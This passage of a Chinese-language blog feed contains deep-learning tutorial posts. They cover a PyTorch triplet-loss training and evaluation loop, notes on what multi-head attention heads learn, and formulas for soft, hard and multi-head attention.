class="line">    <span class="keyword">for</span> i, (anchor, pos, neg) <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_loader):</span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        anchor_output = model(anchor)</span><br><span class="line">        pos_output = model(pos)</span><br><span class="line">        neg_output = model(neg)</span><br><span class="line">        loss = triplet_loss(anchor_output, pos_output, neg_output)</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Validation loop</span></span><br><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    <span class="keyword">for</span> anchor, pos, neg <span class="keyword">in</span> val_loader:</span><br><span class="line">        anchor_output = model(anchor)</span><br><span class="line">        pos_output = model(pos)</span><br><span class="line">        neg_output = model(neg)</span><br><span class="line">        dist_pos = F.pairwise_distance(anchor_output, pos_output)</span><br><span class="line">        dist_neg = F.pairwise_distance(anchor_output, neg_output)</span><br><span class="line">        total += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> dist_pos &lt; dist_neg:</span><br><span class="line">            correct += <span class="number">1</span></span><br><span class="line">accuracy = <span class="number">100</span> * correct / total</span><br><span class="line"></span><br><span class="line"><span class="comment"># Testing loop</span></span><br><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    <span class="keyword">for</span> anchor, pos, neg <span class="keyword">in</span> test_loader:</span><br><span class="line">        anchor_output = model(anchor)</span><br><span class="line">        pos_output = model(pos)</span><br><span class="line">        neg_output = model(neg)</span><br><span class="line">        dist_pos = F.pairwise_distance(anchor_output, pos_output)</span><br><span class="line">        dist_neg = F.pairwise_distance(anchor_output, neg_output)</span><br><span class="line">        total += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> dist_pos &lt; dist_neg:</span><br><span class="line">            correct += <span class="number">1</span></span><br><span class="line">accuracy = <span class="number">100</span> * correct / total</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个示例代码中，我们定义了一个自定义模型，并使用<code>nn.TripletMarginLoss</code>作为损失函数来最小化锚点、正样本和负样本之间的距离。在训练循环中，我们首先通过模型获取锚点、正样本和负样本的输出，然后将它们传递给<code>nn.TripletMarginLoss</code>来计算损失并更新模型参数。</p><p>在验证循环和测试循环中，我们首先通过模型获取锚点、正样本和负样本的输出，然后使用PyTorch内置函数<code>F.pairwise_distance</code>来计算锚点和正样本之间的欧几里得距离（或其他距离度量），以及锚点和负样本之间的距离。如果锚点和正样本之间的距离小于锚点和负样本之间的距离，则认为预测正确。</p><p>请注意，在上面的示例代码中，模型的<code>forward</code>函数只接受一个输入，并且我们假设锚点、正样本和负样本都是从<code>train_loader</code>、<code>val_loader</code>和<code>test_loader</code>中获取的。如果你的输入数据包含两个样本，你可以修改<code>forward</code>函数来接受两个输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x1, x2</span>):</span><br><span class="line">    x = torch.cat((x1, x2), dim=<span class="number">1</span>)</span><br><span class="line">    x = F.relu(self.fc1(x))</span><br><span class="line">    x = self.fc2(x)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在训练循环中，您需要分别传递两个输入分别计算输出。在验证和测试循环中，您需要在计算欧几里得距离之前将两个输入传递给模型以获得它们的特征向量。</p><p><code>with torch.no_grad()</code>是在PyTorch中的上下文管理器，用于在执行代码期间禁用梯度计算和自动求导。这在测试模型时非常有用，因为在测试时我们不需要计算梯度，而且如果开启自动求导，会增加计算时间和内存占用。在<code>with torch.no_grad()</code>中执行的所有操作都不会计算梯度，所以可以加速代码执行速度和节省内存消耗。</p><p>在PyTorch中，<code>model.train()</code>和<code>model.eval()</code>方法是用于控制模型训练和评估模式的。当调用<code>model.train()</code>时，模型将被设置为训练模式，这意味着它将启用dropout和batch normalization等训练特定的操作。当调用<code>model.eval()</code>时，模型将被设置为评估模式，这意味着它将禁用dropout和batch normalization等特定于训练的操作，并使用整个测试集对模型进行评估。在测试或验证期间，应该始终调用<code>model.eval()</code>，以确保模型不会受到dropout等操作的影响，从而获得准确的测试结果。</p>]]></content>
      
      
      <categories>
          
          <category> Deep Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Loss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Multi-Head Attention</title>
      <link href="/2023/10/10/AILearning/DL/Multi-head%20Attention/"/>
      <url>/2023/10/10/AILearning/DL/Multi-head%20Attention/</url>
      
        <content type="html"><![CDATA[<p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242017228.png" alt="image-20240424201713198"></p><h2 id="总结">总结</h2><p>在此，笔者可以得到一些对Multi-Head-Attention的结论：</p><ul><li><p>通俗点理解<strong>Self-Attention就是用Q、K计算出每个token的权重进而对V向量进行提纯的方法</strong>，为什么叫Self-Attention呢，就是Q、K、V是来自于同一个输入经过三个不同的线性变换得到的。</p></li><li><p>对于大部分query，每个头都学习了某种固定的pattern模式，而且12个头中大部分pattern是差不多的，<strong>但是总有少数的pattern才能捕捉到语法/句法/词法信息。</strong></p></li><li><p>《Attention Is All You Need》这篇原论文原文中解释了多头的作用：<strong>将隐状态向量分成多个头，形成多个子语义空间，可以让模型去关注不同维度语义空间的信息（或者说让模型去关注不同方面的信息）。</strong></p></li><li><p>多头attention的有些头的功能是不一样的，有的头可能没啥信息（如第5head），有的头pattern由位置信息主导，有的头由语法信息主导，有的头由词法信息主导，<strong>而能够捕捉到语法/句法/词法信息的头其实是非常少的</strong>（这一点已被大量学术论文证明，笔者的句法破坏实验也验证了这一点）<strong>，那么multi-head的作用就是为了保证这些pattern能够被抽取出来，需要让其有一定的头的基数，因为单头很容易就变成自己注意力全在自己身上了</strong>，这一点也可以从‘以上pattern中大部分pattern都是自己关注自己’这个现象身上得到佐证。</p></li><li><p>越靠近底层的attention，其pattern种类越丰富，关注到的点越多，越到顶层的attention，各个head的pattern趋同。</p></li><li><p>head数越少，**pattern会更倾向于token关注自己本身(**或者其他的比较单一的模式，比如都关注CLS)。</p></li><li><p>多头的核心思想应该就是ensemble，如随机森林一样，将特征切分，每个head就像是一个弱分类器，让最后得到的embedding关注多方面信息，不要过拟合到某一种pattern上。</p></li><li><p>已有论文证明head数目不是越多越好，bert-base上实验的结果为8、16最好，太多太少都会变差。</p></li><li><p>multi-head-attention中大部分头没有捕捉到语法/句法信息，但是笔者这里没办法做出断言说它们是没有用的，具体还是要看下游任务对其的适配程度。个人倾向于大部分pattern只是不符合人类的语法，在不同的下游任务中应该还是有用武之地的。</p></li></ul><blockquote><p><strong>Transformer的角色定位是特征抽取器。所以多头对一个向量切分不同的维度来捕捉不同的pattern，这里就可以解释论文里原话中的不同维度的语义信息。</strong></p></blockquote><p><a href="https://zhuanlan.zhihu.com/p/626820422">Multi-Head-Self-Attention的作用到底是什么? - 知乎 (zhihu.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> Deep Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>注意力机制</title>
      <link href="/2023/10/10/AILearning/DL/%E5%87%A0%E7%A7%8D%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"/>
      <url>/2023/10/10/AILearning/DL/%E5%87%A0%E7%A7%8D%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="注意力机制"><strong>注意力机制</strong></h1><p>注意力机制是深度学习模型中的一种强大工具，可以选择性地关注输入数据的特定特征或部分。注意力机制的引入在各种自然语言处理（NLP）任务中，如机器翻译、文本摘要和语音识别等方面，都取得了显著的改进。</p><p>有几种类型的注意力机制。以下是其中一些最流行的类型：</p><h2 id="1-软注意力"><strong>1. 软注意力</strong></h2><p>软注意力是一种注意力机制，它计算输入特征的加权和，其中权重在训练过程中学习。软注意力通常用于序列到序列模型中，在这种模型中，输出取决于整个输入序列。软注意力已被证明可以显著提高机器翻译模型的性能。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>Soft Attention</mtext><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><msub><mi>T</mi><mi>x</mi></msub></msubsup><msub><mi>α</mi><mi>i</mi></msub><msub><mi>h</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\text{Soft Attention} = \sum_{i=1}^{T_x} \alpha_i h_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord text"><span class="mord">Soft Attention</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2809409999999999em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.981231em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:-0.13889em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>其中，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>T</mi><mi>x</mi></msub></mrow><annotation encoding="application/x-tex">T_x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是输入序列的长度，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>h</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">h_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>个输入特征向量，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>α</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\alpha_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>个特征向量的权重，由以下公式计算：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>α</mi><mi>i</mi></msub><mo>=</mo><mfrac><mrow><mi>exp</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>e</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><mrow><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><msub><mi>T</mi><mi>x</mi></msub></msubsup><mi>exp</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>e</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">\alpha_i = \frac{\exp(e_i)}{\sum_{j=1}^{T_x} \exp(e_j)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.825845em;vertical-align:-0.8158449999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.506975em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.97575em;"><span style="top:-2.177714285714286em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-2.987657142857143em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.23056em;"><span style="top:-2.3em;margin-left:-0.13889em;margin-right:0.1em;"><span class="pstrut" style="height:2.5em;"></span><span class="mord mathdefault mtight">x</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.46117142857142857em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mop mtight">exp</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">exp</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8158449999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>其中，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span></span></span></span>是第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>个特征向量的能量，由以下公式计算：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>e</mi><mi>i</mi></msub><mo>=</mo><mi>a</mi><mo stretchy="false">(</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>h</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e_i = a(s_{i-1}, h_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p>其中，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>s</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">s_{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>是解码器的上一个隐藏状态，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>h</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">h_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是编码器的第i个特征向量，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>是一个可学习的函数，用于计算<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>s</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">s_{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>h</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">h_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>之间的相似度。</p><h2 id="2-硬注意力"><strong>2. 硬注意力</strong></h2><p>硬注意力是一种注意力机制，它在解码过程的每个步骤中从输入序列中选择一个特征。硬注意力通常用于图像字幕任务，其中输出取决于图像的特定区域。硬注意力在计算上比较昂贵，在某些情况下可能会导致性能不佳。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>Hard Attention</mtext><mo>=</mo><msub><mi>h</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\text{Hard Attention} = h_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord text"><span class="mord">Hard Attention</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>其中，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>是解码器的当前步骤，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>h</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">h_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是编码器中与解码器状态最相关的特征向量。</p><h2 id="3-多头注意力"><strong>3. 多头注意力</strong></h2><p>多头注意力是一种注意力机制，它允许模型同时关注输入序列的多个部分。多头注意力在基于Transformer的模型中特别有效，这些模型已成为各种NLP任务中的最先进方法。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>Multi-Head Attention</mtext><mo>=</mo><mtext>Concat</mtext><mo stretchy="false">(</mo><mi>h</mi><mi>e</mi><mi>a</mi><msub><mi>d</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>h</mi><mi>e</mi><mi>a</mi><msub><mi>d</mi><mi>h</mi></msub><mo stretchy="false">)</mo><msup><mi>W</mi><mi>O</mi></msup></mrow><annotation encoding="application/x-tex">\text{Multi-Head Attention} = \text{Concat}(head_1, ..., head_h) W^O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord text"><span class="mord">Multi-Head Attention</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" 